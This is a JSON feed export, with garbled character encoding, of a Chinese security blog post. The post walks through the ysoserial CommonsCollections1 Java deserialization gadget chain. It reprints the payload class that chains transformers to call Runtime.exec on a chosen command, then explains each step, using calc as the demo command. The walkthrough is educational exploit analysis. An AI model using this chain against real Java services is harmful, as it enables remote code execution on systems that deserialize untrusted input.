{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0çš„ç§˜å¯†èŠ±å›­ â€¢ All posts by \"ä»£ç å®¡è®¡\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "title": "ysoserialä¹‹CommonsCollections1è°ƒè¯•",
            "date_published": "2021-09-07T02:12:48.000Z",
            "content_html": "<h1 id=\"åˆ©ç”¨é“¾ç®€è¿°\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨é“¾ç®€è¿°\">#</a> åˆ©ç”¨é“¾ç®€è¿°</h1>\n<ol>\n<li>ä»»æ„æ–¹æ³•æ‰§è¡Œ</li>\n<li>é«˜ç‰ˆæœ¬ java å·²ä¿®å¤ï¼ˆJava 8u71 ä»¥åï¼‰</li>\n</ol>\n<h1 id=\"commonscollections1åˆ©ç”¨ä»£ç \"><a class=\"markdownIt-Anchor\" href=\"#commonscollections1åˆ©ç”¨ä»£ç \">#</a> CommonsCollections1 åˆ©ç”¨ä»£ç </h1>\n<p>é¡¹ç›®åœ°å€ï¼š<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest</span> ( precondition = <span class=\"string\">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CommonsCollections1</span> <span class=\"keyword\">extends</span> <span class=\"title\">PayloadRunner</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">InvocationHandler</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\tPayloadRunner.run(CommonsCollections1.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isApplicableJavaVersion</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"è°ƒè¯•åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#è°ƒè¯•åˆ†æ\">#</a> è°ƒè¯•åˆ†æ</h1>\n<p>ysoserialPOC ç±»ä¸­ getObject æ–¹æ³•ä¸€èˆ¬æ˜¯è·å– payload çš„æ–¹æ³•</p>\n<h2 id=\"åˆ†æpaylaodæ„é€ \"><a class=\"markdownIt-Anchor\" href=\"#åˆ†æpaylaodæ„é€ \">#</a> åˆ†æ paylaod æ„é€ </h2>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// ä¼ å…¥çš„å‘½ä»¤å‚æ•°å­˜å‚¨äºexecArgsæ•°ç»„ä¸­</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">    \t<span class=\"comment\">// å¼€å§‹æ„é€ transformerChainï¼Œç”¨äºæ‰§è¡Œå‘½ä»¤</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// è¿™ä¸€æ­¥æ®pç¥æ‰€è¨€æ˜¯ä¸ºäº†éšè—æ—¥å¿—ä¸­çš„è¿›ç¨‹æ—¥å¸¸ä¿¡æ¯ï¼Œ åŠ ä¸åŠ éƒ½ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œåªæ˜¯å¼‚å¸¸ä¿¡æ¯ä¸åŒ</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// é€šè¿‡åå°„è·å¾—Runtime.exec(),å¹¶å°†å‘½ä»¤å‚æ•°execArgsä¼ å…¥</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) </span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// ä¿®é¥°innerMapï¼Œå°†æ„é€ çš„transformerChainä¼ å…¥</span></span><br><span class=\"line\">    \t<span class=\"comment\">// å½“LayMap#getè¢«è°ƒç”¨æ—¶ï¼Œä¼šæ‰§è¡Œä¼ å…¥çš„transformerChain</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">// å°†lazyMapä¼ å…¥AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// javaä»£ç†sun.reflect.annotation.AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// è·å¾—ä»£ç†å¯¹è±¡æ—¶ï¼Œä¼šå†ä¼ å…¥ä¸€ä¸ªhandlerï¼ˆç®€ç§°handler2ï¼‰ï¼Œå¾—åˆ°ä»£ç†å¯¹è±¡mapProxyï¼Œ</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\">\t\t<span class=\"comment\">// å°†è¯¥ä»£ç†å¯¹è±¡åŒ…è£¹è¿›å…¥æ–°çš„handlerï¼Œç®€ç§°handler1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\">\t\t<span class=\"comment\">// æœ€åå°†æ„é€ å¥½çš„å‘½ä»¤æ‰§è¡Œtransformersä¼ å…¥transformerChain</span></span><br><span class=\"line\">    \t<span class=\"comment\">// æœ€åæ”¾æ˜¯ä¸ºäº†é˜²æ­¢åœ¨æ„é€ payloadæ—¶å¼¹å‡ºè®¡ç®—å™¨</span></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// æœ€ååŒ…è£…å¥½çš„handlerå³ä¸ºæˆ‘ä»¬çš„payload</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"çŸ¥è¯†ç‚¹\"><a class=\"markdownIt-Anchor\" href=\"#çŸ¥è¯†ç‚¹\">#</a> çŸ¥è¯†ç‚¹</h3>\n<p>éœ€è¦ç†è§£çš„çŸ¥è¯†ç‚¹ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼štransform å’Œ proxy</p>\n<p>æƒ³è¦æ·±ç©¶çš„è¯å¯ä»¥å»çœ‹è¯¦ç»†è§£é‡Šï¼Œä»¥ä¸‹åªè®°å½•æ­¤å¤„ç”¨åˆ°çš„ç‚¹</p>\n<p>æˆ‘çœ‹ä»£ç†çš„æ—¶å€™æ˜¯å‚è€ƒçš„è¿™ç¯‡æ–‡ç« ï¼š<a href=\"https://xie.infoq.cn/article/9a9387805a496e1485dc8430f\">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p>\n<h4 id=\"å…ˆæ¥çœ‹çœ‹trasnform\"><a class=\"markdownIt-Anchor\" href=\"#å…ˆæ¥çœ‹çœ‹trasnform\">#</a> å…ˆæ¥çœ‹çœ‹ trasnform</h4>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\"><span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>ConstantTransformer</strong></p>\n<p>æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ªç±»</p>\n<p>é€šè¿‡è¯¥ç±»çš„ transform æ–¹æ³•è·å–ä¸€ä¸ªå¯¹è±¡ç±»å‹ï¼Œå¦‚ transform å‚æ•°æ˜¯ Runtime.class æ—¶ï¼Œè°ƒç”¨ ConstantTransformer ç±»çš„ transform æ–¹æ³•ï¼Œæ‰§è¡Œåè¿”å› java.lang.Runtime ç±»</p>\n<p><strong>InvokerTransformer</strong></p>\n<p>æ„é€ æ–¹æ³• InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)</p>\n<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–¹æ³•å‚æ•°ç±»å‹æ•°ç»„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºæ–¹æ³•å‚æ•°æ•°ç»„</p>\n<p>è¯¥ç±»çš„ transform é€šè¿‡åå°„æ‰§è¡Œå‡½æ•°</p>\n<p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œtransform ä¼ å…¥ Runtime å¯¹è±¡ï¼Œé€šè¿‡åå°„æ‰§è¡Œ exec å‡½æ•°ï¼Œä¼ å…¥å‘½ä»¤ä¸º calc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>\n<p><strong>transformerChain</strong></p>\n<p>transformers çš„é“¾ï¼Œæ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª transform æ•°ç»„</p>\n<p>ä¸²èµ·æ¥äº†å¾ˆå¤š transformer</p>\n<p>ä¸ºä»€ä¹ˆæ˜¯ä¸²èµ·æ¥çš„å‘¢ï¼Œè§ä¸‹å›¾</p>\n<p><img src=\"62.png\" alt=\"\"></p>\n<p>å…¶ä¸­å‰é¢ä¸€ä¸ª transform è¾“å‡ºçš„ç»“æœä¼šä½œä¸ºå‚æ•°ä¼ å…¥åä¸€ä¸ª transform</p>\n<p>é‚£ä¹ˆæ­¤å¤„ä»£ç å°±å¯ä»¥å¾ˆå¥½çš„è§£é‡Šå•¦</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// é€šè¿‡åå°„è·å–Runtimeï¼Œå› ä¸ºClassç±»å®ç°äº†Serializableæ¥å£</span></span><br><span class=\"line\"><span class=\"comment\">//        Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">//        Runtime r = (Runtime) f.invoke(null);</span></span><br><span class=\"line\"><span class=\"comment\">//        r.exec(&quot;C:\\\\WINDOWS\\\\system32\\\\calc.exe&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">    <span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">        <span class=\"comment\">// è¿”å›java.lang.Runtimeç±»</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),  </span><br><span class=\"line\">        <span class=\"comment\">//ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„Runtimeç±»ï¼ˆClasså¯¹è±¡ï¼‰ï¼Œè°ƒç”¨getMethodæ–¹æ³•ï¼Œä¼ å…¥è°ƒç”¨getMethodæ–¹æ³•æ–¹æ³•å‚æ•°ä¸ºgetRuntimeï¼›ä¹Ÿå°±æ˜¯è·å–è¯¥ç±»çš„getRuntimeæ–¹æ³•</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123; </span><br><span class=\"line\">            String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„getRuntimeæ–¹æ³•ï¼ˆMethodå¯¹è±¡ï¼‰ï¼Œè°ƒç”¨invokeæ–¹æ³•ï¼Œä¼ å…¥invokeæ–¹æ³•çš„å‚æ•°ä¸ºObject[]ï¼Œå…¶å®å°±æ˜¯æŒ‰ç…§å‚æ•°åˆ—è¡¨ä¼ å°±å¥½äº†ï¼Œå› ä¸ºæ­¤å¤„åªéœ€è¦è°ƒç”¨invokeæ–¹æ³•è·å¾—Runtimeå¯¹è±¡</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">            Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„Runtimeå¯¹è±¡ï¼Œè°ƒç”¨execæ–¹æ³•ï¼Œä¼ å…¥è¯¥æ–¹æ³•çš„å‚æ•°ä¸ºexecArgs</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"æœ€ååº·åº·proxy\"><a class=\"markdownIt-Anchor\" href=\"#æœ€ååº·åº·proxy\">#</a> æœ€ååº·åº· proxy</h4>\n<p>ä¸ºä»€ä¹ˆä¼šåˆ©ç”¨åˆ°å¯¹è±¡ä»£ç†å‘¢ï¼Ÿ</p>\n<p>å½“ç„¶æ˜¯å› ä¸ºä»£ç†çš„ä¸€äº›äº›ç‰¹æ€§è¾£</p>\n<p>æ¯ä¸ªä»£ç†ç±»æœ‰ä¸€ä¸ªå…¬å…±æ„é€ ä¸€ä¸ªå‚æ•°ï¼Œè¯¥æ¥å£çš„å®ç° <code>InvocationHandler</code>  ï¼Œè®¾ç½®è°ƒç”¨å¤„ç†ç¨‹åºçš„ä»£ç†å®ä¾‹</p>\n<p>åº·åº·æ„é€ æ–¹æ³•ï¼Œä¼šä¼ å…¥ä¸€ä¸ª InvocationHandler å¯¹è±¡</p>\n<p>å¹¶ä¸”åœ¨è°ƒç”¨è¯¥ä»£ç†å¯¹è±¡ä»»æ„æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨ InvocationHandler#invoke ()</p>\n<p><img src=\"63.png\" alt=\"\"></p>\n<p>ä½†æ˜¯è¯¥æ–¹æ³•æ˜¯ protected 